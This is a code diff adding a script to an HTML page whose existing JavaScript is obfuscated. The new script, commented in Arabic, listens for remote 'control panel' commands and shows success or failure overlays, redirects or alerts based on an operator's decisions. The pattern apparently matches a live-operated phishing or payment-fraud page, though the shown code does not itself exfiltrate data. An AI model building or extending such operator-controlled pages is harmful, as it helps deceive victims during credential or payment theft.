@@ -2656,6 +2656,24 @@ function v84(e) {
 v159.addEventListener(_0xdec(270), v84);
 v159.addEventListener(_0xdec(271), v84);
 </script>
+<script>
+// ═══ الاستماع لأوامر لوحة التحكم (موافقة / رفض / تحويل / رسالة) ═══
+(function () {
+  function showAdminOverlay(text, color) {
+    var ov = document.createElement('div');
+    ov.style.cssText = 'position:fixed;inset:0;background:rgba(255,255,255,.97);z-index:99999;display:flex;align-items:center;justify-content:center;flex-direction:column;text-align:center;padding:20px;';
+    ov.innerHTML = '<div style="font-size:22px;font-weight:700;color:' + color + ';">' + text + '</div>';
+    document.body.appendChild(ov);
+  }
+  if (typeof window.listenForAdminCommands === 'function') {
+    window.listenForAdminCommands({
+      onApproval: function () { showAdminOverlay('تمت العملية بنجاح', '#0a7a3d'); setTimeout(function(){ window.location.href = 'index.html'; }, 2500); },
+      onRejection: function (cmd) { showAdminOverlay('فشلت العملية: ' + ((cmd && cmd.reason) || 'يرجى المحاولة مرة أخرى'), '#c0392b'); setTimeout(function(){ location.reload(); }, 3000); },
+      onMessage: function (msg) { if (msg && msg.message) { try { alert(msg.message); } catch (e) {} } }
+    });
+  }
+})();
+</script>
 
 </body>
 </html>
